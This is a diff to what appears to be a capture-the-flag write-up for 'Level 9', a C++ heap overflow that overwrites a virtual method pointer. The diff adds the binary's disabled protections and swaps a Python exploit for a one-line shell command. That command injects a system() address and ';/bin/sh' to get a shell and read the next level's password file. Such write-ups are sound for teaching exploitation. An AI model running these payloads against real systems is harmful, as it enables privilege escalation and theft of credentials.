@@ -1,6 +1,17 @@
 ## Level 9 - C++ Heap Buffer Overflow with Virtual Method Hijacking
 C++ class N has uninitialized str pointer and unbounded memcpy(). Overflow from five object can reach six object's first member, allowing code execution.
 
+### Settings
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
+
 ### Vulnerability
 ```cpp
 void setAnnotation(char *str) {
@@ -27,14 +38,8 @@ int main(int argc, char **argv) {
 ```
 When (***six) executes, system() is called with /bin/sh as argument.
 
-### Execution
-```bash
-python3 exploit.py << 'EOF'
-import struct, subprocess
-payload = struct.pack('<I', 0xb7d86060) + b'A'*104 + struct.pack('<I', 0x0804a00c) + b';/bin/sh'
-p = subprocess.Popen(['/home/user/level9/level9', payload], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-stdout, _ = p.communicate(input=b'cat /home/user/bonus0/.pass\n')
-EOF
-```
 ### Key Insight
 105-byte offset reaches six's first member. Overwrite with system() address, /bin/sh spawns with bonus0 privileges.
+
+### Command
+(echo "cat /home/user/bonus0/.pass"; sleep 1) | /home/user/level9/level9 $(python -c "import struct;print struct.pack('<I',0xb7d86060)+'A'*104+struct.pack('<I',0x0804a00c)+';/bin/sh'")
